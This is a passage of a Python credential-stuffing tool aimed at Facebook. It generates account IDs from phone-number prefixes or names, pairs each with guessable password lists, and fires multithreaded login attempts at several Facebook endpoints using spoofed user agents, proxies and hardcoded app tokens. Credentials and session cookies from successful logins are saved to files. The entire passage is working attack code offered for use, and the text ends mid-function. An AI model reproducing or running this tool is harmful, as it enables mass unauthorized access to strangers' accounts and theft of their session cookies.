    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('[+] LIMIT CLONE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    print("                CHOOSE METHOD                       ")
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(" [1] METHOD (1) ")
    print(" [2] METHOD (2) ")
    print(" [3] METHOD (3) ")
    print(" [4] METHOD (4) ")
    print(" [5] METHOD (5) ")
    print(" [6] METHOD (6) ")
    linex()
    SUMONfire = input("[+] [CHOOSE] :- ")
    linex()
    print(" [?] Show Cookies : (Y/N) ")
    linex()
    c = input(" [?] INPUT : ")
    if c in ["Y", "y"]:
        cookie_show.append("yes")
    else:
        cookie_show.append("no")
    with ThreadPool(max_workers=50) as SUMON_xd:
        clear()
        SUMON_time()
        tl = str(len(user))
        print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
        print(f"[+] YOUR CODE CHOOSED : "+kode)
        linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
        for guru in user:
            uid = kode+guru
            mk = uid[:6]
            pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
            else:
                SUMON_xd.submit(p,uid,pwx,tl)
    linex()
    print('[-] CRACK PROCESS COMPLETE')
    print('[-] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[-] ID SAVE SUMON-OK TXT')
    linex()

def SUMON3():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  9760,9827,9800,9840,9849') 
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    kode = input('[?] INPUT CODE : ')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('[?] LIMIT CLONE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    print("                CHOOSE METHOD                       ")
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(" [1] METHOD (METHOD1) ")
    print(" [2] METHOD (METHOD2) ")
    print(" [3] METHOD (METHOD3) ")
    print(" [4] METHOD (METHOD4) ")
    print(" [5] METHOD (METHOD5) ")
    print(" [6] METHOD (METHOD6) ")
    linex()
    SUMONfire = input("[+] [CHOOSE] :- ")
    linex()
    print(" [?] Do You Want To Show Cookies : (Y/N) ")
    linex()
    c = input(" [?] Input : ")
    if c in ["Y", "y"]:
        cookie_show.append("yes")
    else:
        cookie_show.append("no")
    with ThreadPool(max_workers=30) as SUMON_xd:
        clear()
        SUMON_time()
        tl = str(len(user))
        print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
        print(f"[+] SIM CODE CHOOSED : "+kode)
        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
        linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
        for love in user:
            uid = kode+love
            pwx = [uid+love,'tamang123 ','tamang1234','maya123','pokhara','nepal123','kathmandu123','pokhara123','kathmandu','tamang12345','nepal12345','nepal1234']
            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
            else:
                SUMON_xd.submit(p,uid,pwx,tl)
    linex()
    print('[â] CRACK PROCESS COMPLETE')
    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[â] ID SAVE SUMON-OK TXT')
    linex()

def SUMON4():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (017)')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    kode = input('[?] INPUT CODE : ')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('[?] LIMIT CLONE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    print("                CHOOSE METHOD                       ")
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(" [1] METHOD (METHOD1) ")
    print(" [2] METHOD (METHOD2) ")
    print(" [3] METHOD (METHOD3) ")
    print(" [4] METHOD (METHOD4) ")
    print(" [5] METHOD (METHOD5) ")
    print(" [6] METHOD (METHOD6) ")
    linex()
    SUMONfire = input("[+] [CHOOSE] :- ")
    linex()
    print(" [?] Do You Want To Show Cookies : (Y/N) ")
    linex()
    c = input(" [?] Input : ")
    if c in ["Y", "y"]:
        cookie_show.append("yes")
    else:
        cookie_show.append("no")
    with ThreadPool(max_workers=30) as SUMON_xd:
        clear()
        SUMON_time()
        tl = str(len(user))
        print(f"[+] YOUR TOTAL IDZ  : "+tl+" ")
        print(f"[+] YOUR CODE CHOOSED : "+kode)
        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
        linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
        for love in user:
            uid = kode+love
            mk = uid[:6]
            pwx = [love]
            pwx = [kode+love,mk,'bangladesh', 'freefire', '506070', '708090', 'i love you', '@#@#@#']
            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
            else:
                SUMON_xd.submit(p,uid,pwx,tl)
    linex()
    print('[â] CRACK PROCESS COMPLETE')
    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[â] ID SAVE SUMON-OK TXT')
    linex()

def SUMON5():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] ENTER YOUR FOUR SIM CODE (9725)')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input('[+] PUT CODE : ')
    print("")
    limit = int(input('[+] PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    passx = int(input("[+] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[+] Enter Password : ")
        HamiiID.append(pww)
    clear()
    print("                CHOOSE METHOD                       ")
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(" [1] METHOD (METHOD1) ")
    print(" [2] METHOD (METHOD2) ")
    print(" [3] METHOD (METHOD3) ")
    print(" [4] METHOD (METHOD4) ")
    print(" [5] METHOD (METHOD5) ")
    print(" [6] METHOD (METHOD6) ")
    linex()
    SUMONfire = input("[+] [CHOOSE] :- ")
    linex()
    print(" [+] Do You Want To Show Cookies : (Y/N) ")
    linex()
    c = input(" [+] INPUT : ")
    if c in ["Y", "y"]:
        cookie_show.append("yes")
    else:
        cookie_show.append("no")
    with ThreadPool(max_workers=30) as SUMON_xd:
        os.system("clear")
        print(logo)
        tl = str(len(user))
        print(f"[+] YOUR CODE CHOOSED : "+code)
        print(f"[+] YOUR TOTAL IDZ : "+tl+" ")
        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
        linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
        for love in user:
            uid = code+love
            pwx = [love,uid[:6]]
            for Eman in HamiiID:
                pwx.append(Eman)
            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
            else:
                SUMON_xd.submit(p,uid,pwx,tl)
    linex()
    print('[â] CRACK PROCESS COMPLETE')
    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[â] ID SAVE SUMON-OK TXT')
    linex()

def SUMON6():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    kode = input('[?] Input Code : ')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('[?] LIMIT CLONE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    print("                CHOOSE METHOD                       ")
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(" [1] METHOD (METHOD1) ")
    print(" [2] METHOD (METHOD2) ")
    print(" [3] METHOD (METHOD3) ")
    print(" [4] METHOD (METHOD4) ")
    print(" [5] METHOD (METHOD5) ")
    print(" [6] METHOD (METHOD6) ")
    linex()
    SUMONfire = input("[+] [CHOOSE] :- ")
    linex()
    print(" [?] Do You Want To Show Cookies : (Y/N) ")
    linex()
    c = input(" [?] Input : ")
    if c in ["Y", "y"]:
        cookie_show.append("yes")
    else:
        cookie_show.append("no")
    with ThreadPool(max_workers=30) as SUMON_xd:
        clear()
        SUMON_time()
        tl = str(len(user))
        print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
        print(f"[+] YOUR CODE CHOOSED : "+kode)
        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
        linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
        for love in user:
            uid = kode+love
            mk = uid[:6]
            pwx = [love]
            pwx = [kode+love,mk,'free fire','i love you','57273200']
            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
            else:
                SUMON_xd.submit(p,uid,pwx,tl)
    linex()
    print('[â] CRACK PROCESS COMPLETE')
    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[â] ID SAVE SUMON-OK TXT')
    linex()

def n_clone():
    fresh()
    print(f" {wow('â¢')} ENTER NUMBER WITH COUNTRY CODE ")
    print(f" {wow('â¢')} EXAMPLE : {green}9351048348 ")
    divider()
    number = input(f" {wow('-')} ENTER NUMBER : {green}")
    limit = int(input(f" {wow('-')} ENTER LIMIT  : {green}"))
    code = number[:4]
    for _ in range(limit):
        total = len(number)
        digits = str(total-4)
        xnxxx = "".join(random.choice(string.digits) for _ in range(int(digits)))
        xnxx.append(xnxxx)
    fresh()
    pw_limit = int(input(f" {wow('-')} ENTER PASSWORD LIMIT : {green}"))
    fresh()
    print(f" {wow('â¢')} EXAMPLE : {green}first6, last6 ")
    print(f" {wow('â¢')} EXAMPLE : {green}first7, last7 ")
    print(f" {wow('â¢')} EXAMPLE : {green}khankhan, 57273200 ")
    print(f" {wow('â¢')} EXAMPLE : {green}fullnumber ")
    divider()
    for p in range(pw_limit):
        p_ask = input(f" {wow(p+1)} ENTER PASSWORD : {green}")
        pwx.append(p_ask)
    with tpe(max_workers=55) as Xnxx:
        fresh()
        tl = str(len(xnxx))
        print(f" {wow('-')} TOTAL ACCOUNTS  : {green}{tl} ")
        print(f" {wow('-')} SELECTED NUMBER : {green}{number} ")
        print(f" {wow('!')} {white}USE FLIGHT MODE FOR SPEED UP ")
        divider()
        for user in xnxx:
            uid = code+user
            Xnxx.submit(cracker, uid, pwx, tl)
    divider()
    print(f" {wow('!')} {green}PROCESS COMPLETED ")
    print(f" {wow('â¢')} {green}TOTAL OK : {str(len(oks))} ")
    divider()
    exit()

def g_clone():
    user=[]
    os.system('clear')
    print(logo)
    print(" Ex First : ayesha, kazim, SUMON ")
    print(" Ex Last  : rajput, channa, aaraya ")
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    first = input(' [â¢] First Name : ')
    last = input(' [â¢] Last Name  : ')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    domain = input(' [â¢] Domain : ')
    try:
        limit = int(input(' [â¢] Crack Limit : '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    print("                CHOOSE METHOD                       ")
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(" [1] METHOD (METHOD1) ")
    print(" [2] METHOD (METHOD2) ")
    print(" [3] METHOD (METHOD3) ")
    print(" [4] METHOD (METHOD4) ")
    print(" [5] METHOD (METHOD5) ")
    print(" [6] METHOD (METHOD6) ")
    linex()
    SUMONfire = input("[+] [CHOOSE] :- ")
    linex()
    print(" [?] Do You Want To Show Cookies : (Y/N) ")
    linex()
    c = input(" [?] Input : ")
    if c in ["Y", "y"]:
        cookie_show.append("yes")
    else:
        cookie_show.append("no")
    with ThreadPool(max_workers=30) as SUMON_xd:
        tl = str(len(user))
        os.system("clear")
        print(logo)
        print(' [â¢] CRACKING STARTED ')
        print(' [â¢] TOTAL ACCOUNT : \033[1;32m'+tl)
        print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
        print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            uid = first+'.'+last+'.'+love+domain
            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
            else:
                SUMON_xd.submit(p,uid,pwx,tl)
    linex()
    print('[â] CRACK PROCESS COMPLETE')
    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[â] ID SAVE SUMON-OK TXT')
    linex()

def ____PO_CO____():
    version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
    model_choices = ['SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F']
    build_choices = ['MMB29Q', 'R16NW', 'LRX22C', 'R16NW', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T']
    version = random.choice(version_choices)
    model = random.choice(model_choices)
    build = random.choice(build_choices)
    ver = str(random.choice(range(77, 577))) # Corrected range
    ver2 = str(random.choice(range(57, 77))) # Corrected range
    return (f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36')

def freefb(uid, name, pwx, tl):
    global loop
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [SUMON-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for ps in pwx:
            pw = ps.replace("first", first).replace("last", last).lower()
            Session = requests.Session()
            free_fb = Session.get("https://m.facebook.com").text
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'email': uid,
            'pass': pw,
            'login_source': 'comet_headerless_login',
            'next': '',
            'login': '1',}
            headers = {
            'Host': 'www.facebook.com',
            'content-length': '113',
            'cache-control': 'max-age=0',
            'sec-ch-ua': 'Not?A_Brand;v=99, Samsung',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Linux',
            'origin': 'https://www.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://www.facebook.com/?_rdr',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i',}
            lo = Session.post("https://www.facebook.com/login.php?skip_api_login=1&api_key=210831918949520&kid_directed_site=0&app_id=210831918949520&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D210831918949520%26cbt%3D1746637441002%26e2e%3D%257B%2522init%2522%253A1746637441003%257D%26ies%3D1%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3D4bf32b04-fb21-430c-9cef-708b38c2bc48%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25227a420ded-6b62-47fb-bf0c-927cf5c5b37d%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522akmfg2ciu9hvvvbvvsu0%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.king.candycrushsaga%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DWSu5JU6OsmKLt1JuC3s2kunRik54v8AwBt6wp2S98X0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7a420ded-6b62-47fb-bf0c-927cf5c5b37d%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.king.candycrushsaga%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25227a420ded-6b62-47fb-bf0c-927cf5c5b37d%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522akmfg2ciu9hvvvbvvsu0%2522%257D&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated", data=data, headers=headers).text
            log_cookies = Session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                print(f" {green}[SUMON-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "checkpoint" in log_cookies:
                if "Enter login code to continue" in log_cookies:
                    print(f" {cyan}[SUMON-2F] {uid}|{pw}")
                    open("/sdcard/SUMON_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                    twf.append(uid+"|"+pw)
                    break
                else:
                   #print(f" {red}[SUMON-CP] {uid}|{pw}")
                    open("/sdcard/SUMON_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid+"|"+pw)
                    break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def bapi(uid, name, pwx, tl):
    global loop
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [SUMON-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for ps in pwx:
            pw = ps.replace("first", first).replace("last", last).lower()
            secure = str(uuid.uuid4())
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'Device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_Device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_Session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                'User-Agent': ua(),
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com', 
                'X-FB-Net-HNI': str(random.randint(11111,99999)),
                'X-FB-SIM-HNI': str(random.randint(11111,99999)),
                'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895', 
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-Device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = "https://b-api.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "Session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
                print(f" {green}[SUMON-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {red}[SUMON-CP] {uid}|{pw}")
                open("/sdcard/SUMON_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass     

def graph(uid, name, pwx, tl):
    global loop
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [SUMON-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for ps in pwx:
            pw = ps.replace("first", first).replace("last", last).lower()
            ua_string = ua()
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'Device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_Device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_Session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                'User-Agent': ua(),
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000,40000)),
                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Device-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "Session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
                print(f" {green}[SUMON-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {red}[SUMON-CP] {uid}|{pw}")
                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass     

def mbasic(uid,pwx,tl):
    global oks
    global cps
    global twf
    global loop
    global bkas
    sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            nip=random.choice(xvx)
            proxs= {'http': nip}
            ua = random.choice(uas)
            Session = requests.Session()
            free_fb = Session.get('https://touch.facebook.com/').text
            data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': uid,
            'pass': pw,
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'false',
            'bi_xrwh': '0'}
            headers = {
            'Host': 'm.facebook.com',
            'content-length': 'str(rr(2000,2999))',
            'sec-ch-ua': '"Not.A/Brand";v="18", "Chromium";v="112", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?1',
            'user-agent': 'Mozilla/5.0 (Symbian/3; Series60/2.5 Nokia9258/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.3.1 Mobile Safari/535.1',
            'viewport-width': 'str(rr(400,589))',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': 'AVr3lkj6xU0',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'x-asbd-id': '129477',
            'x-requested-with': 'com.android.chrome',
            'sec-ch-ua-full-version-list': '"Not.A/Brand";v="9.0.0.0", "Chromium";v="113.0.4267.237", "Google Chrome";v="111.0.5252.246"',
            'sec-ch-prefers-color-scheme': 'light',
